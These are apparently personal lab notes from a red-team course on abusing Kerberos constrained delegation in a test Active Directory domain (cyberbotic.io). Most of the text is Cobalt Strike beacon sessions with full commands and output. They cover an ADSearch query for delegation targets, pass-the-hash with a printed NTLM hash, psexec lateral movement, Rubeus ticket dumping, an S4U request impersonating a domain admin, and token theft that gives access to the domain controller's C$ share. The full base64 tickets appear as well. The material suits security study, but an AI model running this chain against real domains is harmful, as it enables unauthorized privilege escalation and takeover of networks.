Constrained delegation was later introduced with Windows Server 2003 as a safer means for services to perform Kerberos delegation.  It aims to restrict the services to which the server can act on behalf of a user.  It no longer allows the server to cache the TGTs of other users, but allows it to request a TGS for another user with its own TGT.

# WINDOWS 2003
![[Pasted image 20231205185659.png]]
In this case, SQL-2 can act on behalf of _any_ user to the _cifs_ service on DC-2.  CIFS is quite powerful as it allows you to list file shares and transfer files.  To find computers configured for constrained delegation, search for those whose  `msds-allowedtodelegateto` attribute is not empty.

```powershell
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes dnshostname,samaccountname,msds-allowedtodelegateto --json

[*] TOTAL NUMBER OF SEARCH RESULTS: 1
[
  {
    "dnshostname": "sql-2.dev.cyberbotic.io",
    "samaccountname": "SQL-2$",
    "msds-allowedtodelegateto": [
      "cifs/dc-2.dev.cyberbotic.io/dev.cyberbotic.io",
      "cifs/dc-2.dev.cyberbotic.io",
      "cifs/DC-2",
      "cifs/dc-2.dev.cyberbotic.io/DEV",
      "cifs/DC-2/DEV"
    ]
  }
]
```
To perform the delegation, we need the TGT of the principal (computer or user) trusted for delegation.  The most direct way is to extract it with Rubeus `dump`:

to get onto `SQL-2` impersonate `DEV/jking` `pth DEV\jking 59fc0f884922b4ce376051134c71e22c` and `psexec`  `jump psexec64 sql-2.dev.cyberbotic.io smb`
```powershell
[12/06 00:11:05] beacon> run hostname
[12/06 00:11:05] [*] Tasked beacon to run: hostname
[12/06 00:11:05] [+] host called home, sent: 26 bytes
[12/06 00:11:05] [+] received output:
sql-2
[12/06 00:11:10] beacon> getuid
[12/06 00:11:10] [*] Tasked beacon to get userid
[12/06 00:11:10] [+] host called home, sent: 8 bytes
[12/06 00:11:10] [*] You are NT AUTHORITY\SYSTEM (admin)
```
`Rubeus.exe` triage with `execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage` to get `krbtgt LUID`
- this allows us to retrieve the `luid` of the computer `SQL-2` service `krbtgt`
```powershell
[12/06 00:11:19] beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
[12/06 00:11:24] [*] Tasked beacon to run .NET program: Rubeus.exe triage
[12/06 00:11:24] [+] host called home, sent: 550664 bytes
[12/06 00:11:25] [+] received output:

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.2 


Action: Triage Kerberos Tickets (All Users)

[*] Current LUID    : 0x3e7

 ------------------------------------------------------------------------------------------------------------- 
 | LUID  | UserName                   | Service                                       | EndTime              |
 ------------------------------------------------------------------------------------------------------------- 
 | 0x3e4 | sql-2$ @ DEV.CYBERBOTIC.IO | krbtgt/DEV.CYBERBOTIC.IO                      | 12/6/2023 9:50:39 AM |
 | 0x3e4 | sql-2$ @ DEV.CYBERBOTIC.IO | ldap/dc-2.dev.cyberbotic.io                   | 12/6/2023 9:50:39 AM |
 | 0x3e4 | sql-2$ @ DEV.CYBERBOTIC.IO | cifs/dc-2.dev.cyberbotic.io                   | 12/6/2023 9:50:39 AM |
 | 0x3e7 | sql-2$ @ DEV.CYBERBOTIC.IO | krbtgt/CYBERBOTIC.IO                          | 12/6/2023 9:51:59 AM |
 | 0x3e7 | sql-2$ @ DEV.CYBERBOTIC.IO | LDAP/dc-2.dev.cyberbotic.io/dev.cyberbotic.io | 12/6/2023 9:51:59 AM |
 | 0x3e7 | sql-2$ @ DEV.CYBERBOTIC.IO | ldap/dc-1.cyberbotic.io                       | 12/6/2023 9:51:59 AM |
 ------------------------------------------------------------------------------------------------------------- 
```
use the `luid` with `Rubeus.exe` to grab the `TGT` of `SQL-2`
```powershell
[12/06 00:12:18] beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap
[12/06 00:12:23] [*] Tasked beacon to run .NET program: Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap
[12/06 00:12:23] [+] host called home, sent: 550732 bytes
[12/06 00:12:24] [+] received output:

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.2 


Action: Dump Kerberos Ticket Data (All Users)

[*] Target service  : krbtgt
[*] Target LUID     : 0x3e4
[*] Current LUID    : 0x3e7

  UserName                 : SQL-2$
  Domain                   : DEV
  LogonId                  : 0x3e4
  UserSID                  : S-1-5-20
  AuthenticationPackage    : Negotiate
  LogonType                : Service
  LogonTime                : 12/5/2023 11:49:24 PM
  LogonServer              : 
  LogonServerDNSDomain     : 

      doIFpDCCBaCgAwIBBaEDAgEWooIEnDCCBJhhggSUMIIEkKADAgEFoRMbEURFVi5DWUJFUkJPVElDLklPoiYwJKADAgECoR0wGxsGa3JidGd0GxFERVYuQ1lCRVJCT1RJQy5JT6OCBEowggRGoAMCARKhAwIBAqKCBDgEggQ0po1bfBmWr3uPgomh5yoQOUcb3bAQzipUAS9dHiAl2TzqJA+Z4CZCQAZO/SxL5xbT9d55nBgFwp3yVRNTaZ2mEAy1NDHCBoCYc8qqyOrar+qhfzUgHbFqD5A7lBuCwsGwOJLuQA0AeIMij1CdbmNXywkpCNNSyWe7F0w6zx+Db4q0aRV3OxzbkNmKoz4yzz22x05/HUP38ukX5wCxnlubu7Zc6gpGaeuPCPZwN9p9QkHa48zaFC/oS5+eO5El8Ajo3v8J8o1lTBHQJPh5+P5a1CTXT5kIZebTSFrWfFQoHXEkspCEK2l0S8tve/PLeAYHPr8TrxfeeXoemmKIMa641hER3y26s5YHylVa8KILojqY32226PmP21uLnorUhbtqUByKP6Z3XRVGHaNXdbDf858o4Ow35E0gE56QAvLh7IGpP4Gvb7rIBCaUqTW/mvJYX/4zGG59wbG7JHDJiE1oKMhMPFN6q12cNv+pSjNVicW/nvWe8X6oR5PTwmQlLRhMFJ0lV7r9XshbREsoKhFYA53QdaTPFS5FCCx9qpIik+LwYvc+d23K7/Q2G9c0DpQGrCpoyzNLx4nAl7+JcSHRfZd+rYbte+yJ3Ax88AyNWAeMeXm6Mq8ToNDy1wFn9g/5GvwWXQWQK5x9yh/84QIoa5pg5VL4sGa62C2TEsdiDbVA3mrYSbkoDWcKs3OMIvCfZyIvHvHanevzMxW/tFAXz0QfoZcQubloEMNNMGN9x1tLoHlH2IsG1ErXBjDBVP3OIoe9Too0O2cGQ2UaWS5vcK92DWtmUKWkb7OVmkNO2ZuJhWifM75Ngafco/eBpXs/C3DYAyLanQahWOLkAVNCNSDjbsDGD4zBMqM7Dkno7SqNJ4hUxN9EFo9m6sHyMLr9VImyxAUkxUENfbzqFCk6nYtFkZPsha88pubqycjCEjyKZNCq1E7KzXpYDjbi4blBFZ24NDkfIM7VfTX7LwE6jUKgjIBl3KqUqr3U11ycXS2bgaG35dhCQnMsi4yeBdNOoHyslLi3AHKIduGmgdSyGqQqYHV0Nw3YxEoslMoVcUoxEceOEqT8i1h/3j5b5ip+RMURx3tVHEUEescNHzaeeqZ4uL1DlniIDSasIGmSQItS9jmSqGEvdl0JoNmRDGvl+WKNSNQk/63w0wZ8vfHTVOIfKCgdQYn3ICB+LFg+D71GADUTuAoVIpqMmZzhvC8+PEynrN6G5bWM3KXLPNILUvo3sNZZ/Mc77ubbeuQcWttGap6bucAc9lKgX6eIx9nC2O4GTBvjgRpELZrt7KnuWRB5z5lIxSXZubVSnl5OonXPcFq8jUNKdNpxaOcP36ZLDhqXRd+OzbQOxwOTx9+cqRSCwCjA0a9uFhZekT0ipiIVef2OVr1VjXlbnL8VFbpN7kZElRrRILdjuHdVZpGC+4Njal2jgfMwgfCgAwIBAKKB6ASB5X2B4jCB36CB3DCB2TCB1qArMCmgAwIBEqEiBCBvJnjfoTeyLYwo/MX1dD2op9/s5FZCMru0P5yafejHpqETGxFERVYuQ1lCRVJCT1RJQy5JT6ITMBGgAwIBAaEKMAgbBlNRTC0yJKMHAwUAQOEAAKURGA8yMDIzMTIwNTIzNTAzOVqmERgPMjAyMzEyMDYwOTUwMzlapxEYDzIwMjMxMjEyMjM1MDM5WqgTGxFERVYuQ1lCRVJCT1RJQy5JT6kmMCSgAwIBAqEdMBsbBmtyYnRndBsRREVWLkNZQkVSQk9USUMuSU8=
```
utlize the `TGT` spit out to `impersonate` `DEV\nlamb` and perform an `S4U` request to obtain a usable `TGS` for `CIFS` on `DC-2`
*Remember that we can impersonate any user in the domain, but we want someone who we know to be a local admin on the target.  In this case, a domain admin makes the most sense.*
- `nlamb` is a `DA`
- `/impersonateuser` is the user we want to impersonate.
- `/msdsspn` is the service principal name that SQL-2 is allowed to delegate to.
- `/user` is the principal allowed to perform the delegation.
- `/ticket` is the TGT for `/user`.
```powershell
[12/06 00:21:47] beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:nlamb /msdsspn:cifs/dc-2.dev.cyberbotic.io /user:sql-2$ /ticket:doIFpDCCBaCgAwIBBaEDAgEWooIEnDCCBJhhggSUMIIEkKADAgEFoRMbEURFVi5DWUJFUkJPVElDLklPoiYwJKADAgECoR0wGxsGa3JidGd0GxFERVYuQ1lCRVJCT1RJQy5JT6OCBEowggRGoAMCARKhAwIBAqKCBDgEggQ0po1bfBmWr3uPgomh5yoQOUcb3bAQzipUAS9dHiAl2TzqJA+Z4CZCQAZO/SxL5xbT9d55nBgFwp3yVRNTaZ2mEAy1NDHCBoCYc8qqyOrar+qhfzUgHbFqD5A7lBuCwsGwOJLuQA0AeIMij1CdbmNXywkpCNNSyWe7F0w6zx+Db4q0aRV3OxzbkNmKoz4yzz22x05/HUP38ukX5wCxnlubu7Zc6gpGaeuPCPZwN9p9QkHa48zaFC/oS5+eO5El8Ajo3v8J8o1lTBHQJPh5+P5a1CTXT5kIZebTSFrWfFQoHXEkspCEK2l0S8tve/PLeAYHPr8TrxfeeXoemmKIMa641hER3y26s5YHylVa8KILojqY32226PmP21uLnorUhbtqUByKP6Z3XRVGHaNXdbDf858o4Ow35E0gE56QAvLh7IGpP4Gvb7rIBCaUqTW/mvJYX/4zGG59wbG7JHDJiE1oKMhMPFN6q12cNv+pSjNVicW/nvWe8X6oR5PTwmQlLRhMFJ0lV7r9XshbREsoKhFYA53QdaTPFS5FCCx9qpIik+LwYvc+d23K7/Q2G9c0DpQGrCpoyzNLx4nAl7+JcSHRfZd+rYbte+yJ3Ax88AyNWAeMeXm6Mq8ToNDy1wFn9g/5GvwWXQWQK5x9yh/84QIoa5pg5VL4sGa62C2TEsdiDbVA3mrYSbkoDWcKs3OMIvCfZyIvHvHanevzMxW/tFAXz0QfoZcQubloEMNNMGN9x1tLoHlH2IsG1ErXBjDBVP3OIoe9Too0O2cGQ2UaWS5vcK92DWtmUKWkb7OVmkNO2ZuJhWifM75Ngafco/eBpXs/C3DYAyLanQahWOLkAVNCNSDjbsDGD4zBMqM7Dkno7SqNJ4hUxN9EFo9m6sHyMLr9VImyxAUkxUENfbzqFCk6nYtFkZPsha88pubqycjCEjyKZNCq1E7KzXpYDjbi4blBFZ24NDkfIM7VfTX7LwE6jUKgjIBl3KqUqr3U11ycXS2bgaG35dhCQnMsi4yeBdNOoHyslLi3AHKIduGmgdSyGqQqYHV0Nw3YxEoslMoVcUoxEceOEqT8i1h/3j5b5ip+RMURx3tVHEUEescNHzaeeqZ4uL1DlniIDSasIGmSQItS9jmSqGEvdl0JoNmRDGvl+WKNSNQk/63w0wZ8vfHTVOIfKCgdQYn3ICB+LFg+D71GADUTuAoVIpqMmZzhvC8+PEynrN6G5bWM3KXLPNILUvo3sNZZ/Mc77ubbeuQcWttGap6bucAc9lKgX6eIx9nC2O4GTBvjgRpELZrt7KnuWRB5z5lIxSXZubVSnl5OonXPcFq8jUNKdNpxaOcP36ZLDhqXRd+OzbQOxwOTx9+cqRSCwCjA0a9uFhZekT0ipiIVef2OVr1VjXlbnL8VFbpN7kZElRrRILdjuHdVZpGC+4Njal2jgfMwgfCgAwIBAKKB6ASB5X2B4jCB36CB3DCB2TCB1qArMCmgAwIBEqEiBCBvJnjfoTeyLYwo/MX1dD2op9/s5FZCMru0P5yafejHpqETGxFERVYuQ1lCRVJCT1RJQy5JT6ITMBGgAwIBAaEKMAgbBlNRTC0yJKMHAwUAQOEAAKURGA8yMDIzMTIwNTIzNTAzOVqmERgPMjAyMzEyMDYwOTUwMzlapxEYDzIwMjMxMjEyMjM1MDM5WqgTGxFERVYuQ1lCRVJCT1RJQy5JT6kmMCSgAwIBAqEdMBsbBmtyYnRndBsRREVWLkNZQkVSQk9USUMuSU8= /nowrap
[12/06 00:21:52] [+] received output:

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.2 

[*] Action: S4U

[*] Action: S4U

[*] Building S4U2self request for: 'SQL-2$@DEV.CYBERBOTIC.IO'
[*] Using domain controller: dc-2.dev.cyberbotic.io (10.10.122.10)
[*] Sending S4U2self request to 10.10.122.10:88
[+] S4U2self success!
[*] Got a TGS for 'nlamb' to 'SQL-2$@DEV.CYBERBOTIC.IO'
[*] base64(ticket.kirbi):

      doIFnDCCBZigAwIBBaEDAgEWooIEqDCCBKRhggSgMIIEnKADAgEFoRMbEURFVi5DWUJFUkJPVElDLklPohMwEaADAgEBoQowCBsGU1FMLTIko4IEaTCCBGWgAwIBEqEDAgECooIEVwSCBFPtq0Bd8hiVzRgLHTTeIaCPPANF6klDRJNMYbRYsm6I1ijg2PjMGpKqoiXxEnCiGYeYzam9Bg2pa5uwtnqjEGr6IQzOKGgBXEZREFdws8qakUB3wSNmn3ZuKPBvy1pgAAjgnDcWpUkL0W82S+qLf6mvLIxFcCLu0Xuu7agQbPv0hzz9PQulKqPIkSTvqm0c9yuEtTcMNSEsLuURMh0ePzeFgpFZ1gsjTy0JpOTPMHCkgQthIOmXQRK35TmUMlBXCE6ftK4jQR/rAu1C8QrWvijoFriUHslHpU0I3hH/9SZm5ynVbpVeEzOzKVShhWVKyYJ9ESPO+pyhxJlkJk6+LhvL7ZyaMUVWNLloUxRyqAmOrWHJjX/wk5xI/4w+06bPt+79/ZQZJy7sX91rA9OuDr4b6a42EIAM9sje+pt7+8nfKjhnpG+caJtfpY8zOaEV8Q7tP+Z9UZCIEhCFOLzn1hPqV+pDEz+4Ai6Ejn026vTJpmVWxUnbg7W1lTXMe4x8dgZfCVRBAbigHdHaCc284mJNspVfIhr7krKo26y05eDNB8bHjrHWr6uPWD1PDmkpvGNhiYm4inSGyk2mmgekWmpgmIAb6zHqHoEMeUzkdSxZdDjl4tk4qe2BrDcsHQG8X+Gq9t56qAYIla+0rDbqy0agIS972zuActwp0F+xoBV1rBDrqtc1TmGMmkm9FtxeXuJq3wL3U2Q/nIT0U0FXpaqo0DMsU7J4VUWaCOtGTH6UMGZHcfiUNgjZyAp7WzR9smya7wwppKlwT8g6GIn+uQJVxW1mGlYFlWYvHzdNIIMtrdVkugS6cVdscJWPcWZavxvbq1ap250tk7hO5ON3GzuNLVvLVtlRe8WaYcKLi/3DKueCgc+Pkvc8PlyTfW/j7AshIu0O0P8BHSP8hzLxSoGVhUJVsCzx7PVhuFBI2wfBt5FBLyKSuFhMyR3YgatGsUXHwp/LAxFy1YKCn4dT9H+uv8wmRNnXyLaDHSEKslfMeQT02PgoLs4SQwh0pGnK7iXOzYDHUlhpJB4R4FEeNTVOhSVetOPhjsgf4+YmSaw4TOlV7vRV5Y3FcEMrMrsJEFBcn2gngQpf5IzH4l4T+De+smc4fQFBw1CX92sASLU/KwIo+mTgMAi34H0Q1xIbj96EntpOFv0eoXnvh0iU9hzRjjOeR+XbxNLinaK3pICzDWSOTcDeLZaqU24I6V1POfYoxr39g5QqsiFaUlRspRtfAnOCgxV+vYaTCMfrjRBH2z96VJCnGemfVrf8S8ZqtEVNDCrgkktiDPmVnK+vjDCiQ4dMsVCMn/Uzr0JZ4m74OzYr9QOifyIenrtYfAlOL5NNnZC5DrY8CrNhNuGFqsNWA06XKz5fVhggKY0zI+gG0JaVuwITxzIzgR3xCTxuZamVIF2mwf4fvmVcm4DHBF2irYKeVQlwijy8eIlYBC+wNGEHgAvkFkGWEYt6QyKLXm0rcFijgd8wgdygAwIBAKKB1ASB0X2BzjCBy6CByDCBxTCBwqArMCmgAwIBEqEiBCAFIS0dyvn+JkXsvs3bWsDKgT0jQHVOAZlSH3GsYohc7aETGxFERVYuQ1lCRVJCT1RJQy5JT6ISMBCgAwIBCqEJMAcbBW5sYW1iowcDBQBAoQAApREYDzIwMjMxMjA2MDAyMTUxWqYRGA8yMDIzMTIwNjA5NTAzOVqnERgPMjAyMzEyMTIyMzUwMzlaqBMbEURFVi5DWUJFUkJPVElDLklPqRMwEaADAgEBoQowCBsGU1FMLTIk

[*] Impersonating user 'nlamb' to target SPN 'cifs/dc-2.dev.cyberbotic.io'
[*] Building S4U2proxy request for service: 'cifs/dc-2.dev.cyberbotic.io'
[*] Using domain controller: dc-2.dev.cyberbotic.io (10.10.122.10)
[*] Sending S4U2proxy request to domain controller 10.10.122.10:88
[+] S4U2proxy success!
[*] base64(ticket.kirbi) for SPN 'cifs/dc-2.dev.cyberbotic.io':

      doIGaDCCBmSgAwIBBaEDAgEWooIFbjCCBWphggVmMIIFYqADAgEFoRMbEURFVi5DWUJFUkJPVElDLklPoikwJ6ADAgECoSAwHhsEY2lmcxsWZGMtMi5kZXYuY3liZXJib3RpYy5pb6OCBRkwggUVoAMCARKhAwIBBKKCBQcEggUDIB1HQNBcT3aib1nV9k1sdNU6DzfTKSvjzyM2Lk+eyhP4or5ANwqssGRQPnrYZGrsIWnjXjNgfIc5yWAjsnzZnrqzOwJdCHIpHcjrSKZ6Di9Alj6zogKT6qBh5+pX7RvRqNs6eXSOmbX1LD0Gus5cabZi1u38Je4ucsrOEQNg58ewl8r7GjpJ7kUAWxUyODEuOxqseiHWao8HMbztV4kdYsUTgeo7OMZ2dLQ/RFbhMZIrV4Lus4V0bc7lqm8AT5+ItncyFxnrTdbcXO//bgkBNdO1URXbVPOqOr/pQX3SP8pjvBGPD0IGQBSczhu/PYoXSDXhTx88Y3yqopyGHiWVkbMgj4CThq665r9F0pjJBVv5JgbRroZXVAiKQvo/IK7TtKKzjm8RahPlJPynz0mNiQXKempJEfVSzpFQoTguLOKXPewdv9JeH6S61gryrJQ9cun4cEhiWawwiFiNBmVccIJ+Autbnpa9/x5o2wq4q7px+BAjwD8iUMnEUICAnp/xux35tWkel3HM46lvPHjqQevqTiAqt6ms0baB4DU6ZTmvwKivVcdUX05pevNL9k9ccdcaMUhQpD8miF9KgSpZ/JychdlMLVDenZMaqfnm6+UnWhh1ilrjw4n8kbEuJ7KMhMr+lHz3KpQvu8dZCXKHBm7jgxJCAjqJJ/2+1qwxJzo20dqcHtiSg65Eog/100Gez+zeqN9EgarIAuhfs99oPxrCSGghTXwCYIUGHK+Bqb+6Jh/DOz5+M67IHOLmkw7iHKiAaPpKtNGbaSR+lyVix1KWK0BQGSW5r95qm8Yf6Em53/tyJ//OwyIac9XiBPp5Mq5DQgnCtybbfCYzp9Wn4ov8UX5meagIWYriFXrT2e/iZYBLAL1KuIcGKslu4FGjEarsRFPcIMq5LFG15q4L5HzBLEiprLSG8lI09SCQuityosxbGnzI2DwvIzBxR5AZzRHZMOLd49gWlDjifKhCFNLfB51PqhOUir0LOMY28zJH0UL4YNhfUPykGlplXf7boGRVCediJLe3+ALRjgsNM3TUM1Uh1Q3sLi5C2n2BjpfGLCXU2bYImBqE6uZSuxfEpC9vqhcFddy9sMiHlR9SM5F9H31GQHmUDSUB71Rj4cubxkNptX/fKjobTLe1znDbasOP/qlccXR7dQi7irq4QVh1ARK3H4TPcz5evMF7oFkFMuaDqOwJCqjunMz+8o4FxkAdINojIq0zyJLHMH8Qpbs8i7OX26y0N5XZC3MYZu+oDCRZFqQf2PlzPWEIjQgvhx4Ho6GREk+dhuK739MZfzNfDfWshvbexXuNp58ak7VQO1+zQqD+BWcyW7BRIQVpXsqUH5K/I5vzSmVSgpJNPJw6D61+gGcqE3ESiVbm/N8xtvlJvwhKErmkQe7AyqQ44A2lx5BFbE0J92R7C7u4/2KyDpIrUl3K6vEVAAoLYMZnn469aW7UU6EwSDPibEzyFBGvIRjRGsVE9xbvQCUxGs620ntTXpa4pNTemNoGGqI7lYjzkZri0iUdP+9qqt3FNjalF376I42Dtf5TsFpBJhInf4iE1C5qvE6V954k4BT25eEkL7nae8Z252jPt5+mKG1UZT1KgAE+2OgoiUsoFRp3we6JdTsjO7jYlRS4xNe5tD17YdR/QXfO/h3gnqSQfcdxWzTN50qLCCQodOwj5BObyx88QJz8Z0GDIH2l+WvNubSjgeUwgeKgAwIBAKKB2gSB132B1DCB0aCBzjCByzCByKAbMBmgAwIBEaESBBA4So/aLyADgYRDU/Gbo4W4oRMbEURFVi5DWUJFUkJPVElDLklPohIwEKADAgEKoQkwBxsFbmxhbWKjBwMFAEClAAClERgPMjAyMzEyMDYwMDIxNTFaphEYDzIwMjMxMjA2MDk1MDM5WqcRGA8yMDIzMTIxMjIzNTAzOVqoExsRREVWLkNZQkVSQk9USUMuSU+pKTAnoAMCAQKhIDAeGwRjaWZzGxZkYy0yLmRldi5jeWJlcmJvdGljLmlv

```
this spits out a `S4U2proxy ticket`, once we have one we can pass it into a new logon session and `steal_token`
```powershell
[12/06 00:23:07] beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket: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
[12/06 00:23:12] [+] received output:

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.2 


[*] Action: Create Process (/netonly)


[*] Using DEV\nlamb:FakePass

[*] Showing process : False
[*] Username        : nlamb
[*] Domain          : DEV
[*] Password        : FakePass
[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
[+] ProcessID       : 3960
[+] Ticket successfully imported!
[+] LUID            : 0x21a16a

[12/06 00:23:26] beacon> steal_token 3960
[12/06 00:23:26] [*] Tasked beacon to steal token from PID 3960
[12/06 00:23:26] [+] host called home, sent: 12 bytes
[12/06 00:23:26] [+] Impersonated NT AUTHORITY\SYSTEM
```
now we have access to `\\dc-2.dev.cyberbotic.io\c$`
```powershell
[12/06 00:24:05] beacon> ls \\dc-2\c$
[12/06 00:24:05] [*] Tasked beacon to list files in \\dc-2\c$
[12/06 00:24:06] [+] host called home, sent: 27 bytes
[12/06 00:24:06] [-] could not open \\dc-2\c$\*: 1326 - ERROR_LOGON_FAILURE
```
always ensure to have the full `FQDN` when connecting to `shares`
```powershell
[12/06 00:24:00] beacon> ls \\dc-2.dev.cyberbotic.io\c$
[12/06 00:24:00] [*] Tasked beacon to list files in \\dc-2.dev.cyberbotic.io\c$
[12/06 00:24:00] [+] host called home, sent: 45 bytes
[12/06 00:24:00] [*] Listing: \\dc-2.dev.cyberbotic.io\c$\

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     08/15/2022 15:44:08   $Recycle.Bin
          dir     08/10/2022 04:55:17   $WinREAgent
          dir     08/10/2022 05:05:53   Boot
          dir     08/18/2021 23:34:55   Documents and Settings
          dir     08/19/2021 06:24:49   EFI
          dir     08/15/2022 16:09:55   inetpub
          dir     05/08/2021 08:20:24   PerfLogs
          dir     09/26/2023 09:25:37   Program Files
          dir     08/10/2022 04:06:16   Program Files (x86)
          dir     11/02/2023 19:48:51   ProgramData
          dir     08/15/2022 15:23:23   Recovery
          dir     08/16/2022 12:37:38   Shares
          dir     09/05/2022 12:03:43   System Volume Information
          dir     08/15/2022 15:24:39   Users
          dir     09/26/2023 09:28:03   Windows
 427kb    fil     08/10/2022 05:00:07   bootmgr
 1b       fil     05/08/2021 08:14:33   BOOTNXT
 181b     fil     11/04/2022 11:31:03   CheckServiceHealth.ps1
 1kb      fil     08/15/2022 16:16:13   dc-2.dev.cyberbotic.io_sub-ca.req
 12kb     fil     12/05/2023 23:49:27   DumpStack.log.tmp
 384mb    fil     12/05/2023 23:49:27   pagefile.sys
```